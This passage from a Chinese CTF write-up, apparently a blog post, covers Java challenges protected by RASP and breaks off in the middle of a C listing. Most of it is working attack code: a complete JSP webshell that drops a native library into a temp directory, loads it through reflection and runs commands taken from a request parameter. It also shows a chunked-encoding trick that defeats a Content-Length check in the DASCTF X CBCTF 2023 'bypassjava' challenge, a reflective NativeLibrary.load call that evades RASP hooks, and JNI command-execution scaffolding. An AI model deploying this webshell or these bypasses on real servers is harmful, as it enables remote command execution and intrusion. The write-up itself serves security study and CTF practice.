title="小细节"></a>小细节</h4><p>注意想要在别的地方使用这个cmd.dll时，要保证Cmdclass这个类的包名要和当时生成cmd.dll的一样</p><p>不能在别的包下复制粘贴个内容一摸一样的Cmdclass，这样也是行不通的</p><p>举个例子</p><p>我的cmd.dll是由<code>com.javasec</code>包下的文件一步步生成的</p><p>若我在另外一个包下复制粘贴Cmdclass的内容，看看是什么情况</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> Rome;      <span class="hljs-comment">//只是package不一样</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span></span>&#123;    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd);&#125;</code></pre></div><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127174137966.png" alt="image-20231127174137966"></p><p><code>import</code>原来包下的Cmdclass是可以的</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127174341925.png" alt="image-20231127174341925"></p><p>所以关键的就是Cmdclass的包名要和当初生成<code>cmd.dll</code>的一样</p><h4 id="JSP-shell-（不重要，实战把so文件写入服务器的）"><a href="#JSP-shell-（不重要，实战把so文件写入服务器的）" class="headerlink" title="JSP shell   （不重要，实战把so文件写入服务器的）"></a>JSP shell   （不重要，实战把so文件写入服务器的）</h4><div class="code-wrapper"><pre><code class="hljs reasonml">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.io.File&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;&lt;%-- load_library_cmd_all.jsp?cmd=ls --%&gt;&lt;%-- 通过JNI的方式调用动态链接库, 反射调用 ClassLoader 的 loadLibrary0 方法进行加载 --%&gt;&lt;%!    <span class="hljs-keyword">private</span> static final String COMMAND_CLASS_NAME = <span class="hljs-string">&quot;com.anbai.sec.cmd.CommandExecution&quot;</span>;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * JDK1.5编译的com.anbai.sec.cmd.CommandExecution类字节码,</span><span class="hljs-comment">     * 只有一个public static native String exec(String cmd);的方法</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> static final byte<span class="hljs-literal">[]</span> COMMAND_CLASS_BYTES = <span class="hljs-keyword">new</span> byte<span class="hljs-literal">[]</span>&#123;            -<span class="hljs-number">54</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">70</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>,            <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">60</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">100</span>,            <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">76</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">78</span>, <span class="hljs-number">117</span>, <span class="hljs-number">109</span>, <span class="hljs-number">98</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">84</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>,            <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">38</span>, <span class="hljs-number">40</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>,            <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>,            <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">83</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">114</span>,            <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">21</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">100</span>, <span class="hljs-number">69</span>, <span class="hljs-number">120</span>,            <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">117</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">110</span>, <span class="hljs-number">46</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">34</span>,            <span class="hljs-number">99</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">47</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">98</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">47</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">47</span>, <span class="hljs-number">99</span>, <span class="hljs-number">109</span>, <span class="hljs-number">100</span>, <span class="hljs-number">47</span>, <span class="hljs-number">67</span>,            <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">100</span>, <span class="hljs-number">69</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">117</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">110</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>,            <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">79</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>,            <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">29</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">42</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>,            <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>    &#125;;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 获取JNI链接库目录</span><span class="hljs-comment">     * @return 返回缓存JNI的临时目录</span><span class="hljs-comment">     */</span>    File get<span class="hljs-constructor">TempJNILibFile()</span> &#123;        File jniDir = <span class="hljs-keyword">new</span> <span class="hljs-constructor">File(System.<span class="hljs-params">getProperty</span>(<span class="hljs-string">&quot;java.io.tmpdir&quot;</span>)</span>, <span class="hljs-string">&quot;jni-lib&quot;</span>);        <span class="hljs-keyword">if</span> (!jniDir.exists<span class="hljs-literal">()</span>) &#123;            jniDir.mkdir<span class="hljs-literal">()</span>;        &#125;        String filename;        <span class="hljs-keyword">if</span> (is<span class="hljs-constructor">Win()</span>) &#123;            filename = <span class="hljs-string">&quot;cmd.dll&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">if</span> (is<span class="hljs-constructor">Mac()</span>) &#123;                filename = <span class="hljs-string">&quot;libcmd.lib&quot;</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                filename = <span class="hljs-string">&quot;libcmd.so&quot;</span>;            &#125;        &#125;        return <span class="hljs-keyword">new</span> <span class="hljs-constructor">File(<span class="hljs-params">jniDir</span>, <span class="hljs-params">filename</span>)</span>;    &#125;    boolean is<span class="hljs-constructor">Win()</span> &#123;        return (<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span> != null<span class="hljs-operator"> &amp;&amp; </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>.starts<span class="hljs-constructor">With(<span class="hljs-string">&quot;Win&quot;</span>)</span>);    &#125;    boolean is<span class="hljs-constructor">Win32()</span> &#123;        return <span class="hljs-string">&quot;32&quot;</span>.equals(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;sun.arch.data.model&quot;</span>)</span>);    &#125;    boolean is<span class="hljs-constructor">Mac()</span> &#123;        return (<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span> != null<span class="hljs-operator"> &amp;&amp; </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>.starts<span class="hljs-constructor">With(<span class="hljs-string">&quot;Mac&quot;</span>)</span>);    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 高版本JDKsun.misc.BASE64Decoder已经被移除，低版本JDK又没有java.util.Base64对象，</span><span class="hljs-comment">     * 所以还不如直接反射自动找这两个类，哪个存在就用那个decode。</span><span class="hljs-comment">     * @param str</span><span class="hljs-comment">     * @return</span><span class="hljs-comment">     */</span>    byte<span class="hljs-literal">[]</span> base64<span class="hljs-constructor">Decode(String <span class="hljs-params">str</span>)</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">try</span> &#123;                Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>)</span>;                return (byte<span class="hljs-literal">[]</span>) clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(clazz.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>, str);            &#125; catch (ClassNotFoundException e) &#123;                Class  clazz   = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.Base64&quot;</span>)</span>;                Object decoder = clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getDecoder&quot;</span>)</span>.invoke(null);                return (byte<span class="hljs-literal">[]</span>) decoder.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decode&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(decoder, str);            &#125;        &#125; catch (Exception e) &#123;            return null;        &#125;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 写JNI链接库文件</span><span class="hljs-comment">     * @param base64 JNI动态库Base64</span><span class="hljs-comment">     * @return 返回是否写入成功</span><span class="hljs-comment">     */</span>    void write<span class="hljs-constructor">JNILibFile(String <span class="hljs-params">base64</span>)</span> throws IOException &#123;        <span class="hljs-keyword">if</span> (base64 != null) &#123;            File jniFile = get<span class="hljs-constructor">TempJNILibFile()</span>;            <span class="hljs-keyword">if</span> (!jniFile.exists<span class="hljs-literal">()</span>) &#123;                byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span> = base64<span class="hljs-constructor">Decode(<span class="hljs-params">base64</span>)</span>;                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bytes</span> != null) &#123;                    FileOutputStream fos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-params">jniFile</span>)</span>;                    fos.write(<span class="hljs-built_in">bytes</span>);                    fos.flush<span class="hljs-literal">()</span>;                    fos.close<span class="hljs-literal">()</span>;                &#125;            &#125;        &#125;    &#125;%&gt;&lt;%    String cmd = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>;    String jniBytes = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;jni&quot;</span>)</span>;    String COMMAND_JNI_FILE_BYTES;    <span class="hljs-keyword">if</span> (is<span class="hljs-constructor">Win()</span>) &#123;        <span class="hljs-keyword">if</span> (is<span class="hljs-constructor">Win32()</span>) &#123;            <span class="hljs-comment">// windows 32</span>            COMMAND_JNI_FILE_BYTES = <span class="hljs-string">&quot;省略具体的Base64编码信息，请参考javaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">// windows 64</span>            COMMAND_JNI_FILE_BYTES = <span class="hljs-string">&quot;省略具体的Base64编码信息，请参考javaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp&quot;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">if</span> (is<span class="hljs-constructor">Mac()</span>) &#123;            <span class="hljs-comment">// mac</span>            COMMAND_JNI_FILE_BYTES = <span class="hljs-string">&quot;省略具体的Base64编码信息，请参考javaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">// centos 7 64</span>            COMMAND_JNI_FILE_BYTES = <span class="hljs-string">&quot;省略具体的Base64编码信息，请参考javaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp&quot;</span>;        &#125;    &#125;    <span class="hljs-comment">// JNI路径</span>    File jniFile = get<span class="hljs-constructor">TempJNILibFile()</span>;    ClassLoader loader = (ClassLoader) application.get<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;__LOADER__&quot;</span>)</span>;    <span class="hljs-keyword">if</span> (loader<span class="hljs-operator"> == </span>null) &#123;        loader = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ClassLoader(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>) &#123;            @Override            protected Class&lt;?&gt; find<span class="hljs-constructor">Class(String <span class="hljs-params">name</span>)</span> throws ClassNotFoundException &#123;                <span class="hljs-keyword">try</span> &#123;                    return super.find<span class="hljs-constructor">Class(<span class="hljs-params">name</span>)</span>;                &#125; catch (ClassNotFoundException e) &#123;                    return define<span class="hljs-constructor">Class(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.<span class="hljs-params">length</span>)</span>;                &#125;            &#125;        &#125;;        write<span class="hljs-constructor">JNILibFile(<span class="hljs-params">jniBytes</span> != <span class="hljs-params">null</span> ? <span class="hljs-params">jniBytes</span> : COMMAND_JNI_FILE_BYTES)</span>;<span class="hljs-comment">// 写JNI文件到临时文件目录</span>        application.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;__LOADER__&quot;</span>, <span class="hljs-params">loader</span>)</span>;    &#125;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">// load命令执行类</span>        Class  commandClass = loader.load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;com.anbai.sec.cmd.CommandExecution&quot;</span>)</span>;        Object loadLib      = application.get<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;__LOAD_LIB__&quot;</span>)</span>;        <span class="hljs-keyword">if</span> (loadLib<span class="hljs-operator"> == </span>null<span class="hljs-operator"> || </span>!((Boolean) loadLib)) &#123;            Method loadLibrary0Method = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;loadLibrary0&quot;</span>, Class.<span class="hljs-params">class</span>, File.<span class="hljs-params">class</span>)</span>;            loadLibrary0Method.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;            loadLibrary0Method.invoke(loader, commandClass, jniFile);            application.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;__LOAD_LIB__&quot;</span>, <span class="hljs-params">true</span>)</span>;        &#125;        String content = (String) commandClass.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(null, cmd);        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        out.println(content);        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);    &#125; catch (Exception e) &#123;        out.println(e.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);        throw e;    &#125;%&gt;</code></pre></div><p><code>load_library.jsp</code>默认提供了一个<code>MacOSX</code>的<code>JNI</code>库字符串Demo其他系统需要自行编译:<code>com_anbai_sec_cmd_CommandExecution.cpp</code>,编译方式参考后面的<code>JNI</code>章节。<code>load_library.jsp</code>接收两个参数:<code>cmd</code>和<code>jni</code>，参数描述：</p><ol><li><code>cmd</code>需要执行的本地命令</li><li><code>jni</code> 动态链接库文件Base64+URL编码后的字符串(<code>urlEncode(base64Encode(jniFile))</code>),<code>jni</code>参数默认可以不传但是需要手动修改jsp中的<code>COMMAND_JNI_FILE_BYTES</code>变量，<code>jni</code>参数只需要传一次，第二次请求不需要带上。</li></ol><h2 id="DASCTF-X-CBCTF-2023-bypassjava"><a href="#DASCTF-X-CBCTF-2023-bypassjava" class="headerlink" title="DASCTF X CBCTF 2023  bypassjava"></a>DASCTF X CBCTF 2023  bypassjava</h2><p>前面用到<code>chunked</code>编码绕过<code>getContentlength</code>   （Boogipop大佬的图）</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223246594.png" alt="image-20231127223246594"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223305762.png" alt="image-20231127223305762"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223318053.png" alt="image-20231127223318053"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223331810.png" alt="image-20231127223331810"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223343051.png" alt="image-20231127223343051"></p><p>也就看个过程，本地调试调不了一点，根本不会啊，有没有人教我</p><p>看一下pankas师傅也就是出题人，说的追溯调用栈、追溯源码</p><p>在调用栈的开头java.lang.Thread的run启动后，过几个调用栈就会看到进入<code>org.apache.coyote.http11.Http11Processor</code>的<code>prepareInputFilters</code>查看请求头中有没有<code>transfer-encoding</code></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231209234042357.png" alt="image-20231209234042357"></p><p>然后在<code>addInputFilter</code>中匹配<code>chunked</code>，但没看懂他匹配成功后干了啥</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231209234825915.png" alt="image-20231209234825915"></p><p>退出<code>addInputFilter</code>后，<code>prepareInputFilters</code>继续往下会调用<code>getContentLengthLong</code></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231209235050295.png" alt="image-20231209235050295"></p><p><code>this.contentLength</code>为-1，进入else的逻辑，判断请求头中有没有<code>content-length</code>，没有返回-1</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231209235003325.png" alt="image-20231209235003325"></p><p>因为<code>getContentLengthLong</code>返回-1，所以进入if语句，又因为<code>addInputFilter</code>中设置<code>contentDelimitation</code>为<code>true</code>，所以设置<code>/read</code>这个<code>request</code>的<code>ContentLength</code>为-1</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231209235939026.png" alt="image-20231209235939026"></p><p>到了后面<code>doFilter</code>然后<code>getContentLength</code>的时候调用的<code>getContentLengthLong</code>因为<code>this.contentLength</code>为-1，进入else的逻辑，最后获取的<code>length</code>是<code>-1</code>（是<code>(int)length</code>为-1，而不是不满足判断条件才为-1），</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231210001040303.png" alt="image-20231210001040303"></p><p>出题人发包的图（但是不是说Transfer-Encoding和Content-Length不是不能同时出现吗。。。不懂）</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231210001708134.png" alt="image-20231210001708134"></p><p>注意<code>chunked</code>编码的格式</p><h3 id="JNI绕过RASP-1"><a href="#JNI绕过RASP-1" class="headerlink" title="JNI绕过RASP"></a>JNI绕过RASP</h3><p>查看rasp的jar包发现不仅hook了<code>forkAndExec</code>，还hook了 <code>loadLibrary0</code></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119164847556.png" alt="image-20231119164847556"></p><p>我们通过分析<code>System.load</code>方法，会发现比<code>loadLibrary0</code>还要底层的是<code>NativeLibrary</code>的<code>load</code>方法，我们反射调用它即可绕过</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119155237308.png" alt="image-20231119155237308"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119154915494.png" alt="image-20231119154915494"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119155007555.png" alt="image-20231119155007555"></p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span></span>&#123;    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd); &#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>.\Cmdclass.<span class="hljs-keyword">java</span><span class="hljs-keyword"></span><span class="hljs-keyword">javac </span>-cp . .\Cmdclass.<span class="hljs-keyword">java </span>-h <span class="hljs-keyword">jackson.Cmdclass</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span><span class="hljs-comment">/* Header for class jackson_Cmdclass */</span><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_jackson_Cmdclass</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_jackson_Cmdclass</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-comment">/*</span><span class="hljs-comment"> * Class:     jackson_Cmdclass</span><span class="hljs-comment"> * Method:    execCmd</span><span class="hljs-comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span><span class="hljs-comment"> */</span><span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span></span><span class="hljs-function">  <span class="hljs-params">(JNIEnv *, jobject, jstring)</span></span>;<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>&#125;<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span></code></pre></div><p>参照头文件写恶意c文件，包含头文件</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jackson_Cmdclass.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execCmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];              <span class="hljs-comment">//定义缓冲区</span>    FILE *pipe = <span 